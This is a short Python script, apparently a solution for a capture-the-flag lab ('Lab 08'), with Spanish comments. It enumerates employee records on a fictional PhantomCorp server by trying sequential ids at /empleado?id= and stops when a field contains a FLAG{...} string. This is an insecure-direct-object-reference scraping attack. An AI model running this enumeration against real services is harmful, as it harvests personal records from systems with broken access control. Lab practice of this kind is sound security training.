#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Enumera legajos de PhantomCorp y detiene la búsqueda al hallar una flag."""

import argparse
import json
import sys
import urllib.error
import urllib.request


def consultar_legajo(base: str, id_: int, timeout: float = 3.0) -> dict | None:
    """Devuelve el legajo solicitado o ``None`` ante HTTP inválido o error."""
    url = f"{base.rstrip('/')}/empleado?id={id_}"
    try:
        with urllib.request.urlopen(url, timeout=timeout) as respuesta:
            datos = json.loads(respuesta.read().decode("utf-8"))
            return datos if isinstance(datos, dict) else None
    except urllib.error.HTTPError:
        return None
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError) as error:
        print(f"[!] error en id={id_}: {error}", file=sys.stderr)
        return None


def buscar_flag(base: str, desde: int, hasta: int) -> tuple[int, str] | None:
    """Busca una cadena ``FLAG{...}`` en los legajos del intervalo inclusivo."""
    if desde > hasta:
        raise ValueError("--desde no puede ser mayor que --hasta")

    for id_ in range(desde, hasta + 1):
        legajo = consultar_legajo(base, id_)
        if legajo is None:
            continue

        for valor in legajo.values():
            if isinstance(valor, str) and valor.startswith("FLAG{") and valor.endswith("}"):
                return id_, valor

    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Recolector de legajos (Lab 08)")
    parser.add_argument("--base", default="http://phantomcorp-db")
    parser.add_argument("--desde", type=int, default=1)
    parser.add_argument("--hasta", type=int, default=250)
    args = parser.parse_args()

    print(f"[*] Enumerando legajos {args.desde}..{args.hasta} en {args.base}")
    try:
        hallazgo = buscar_flag(args.base, args.desde, args.hasta)
    except ValueError as error:
        parser.error(str(error))

    if hallazgo:
        id_, flag = hallazgo
        print(f"[+] Flag en el legajo id={id_}: {flag}")
        return 0

    print("[-] No se encontró el flag en el rango dado.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
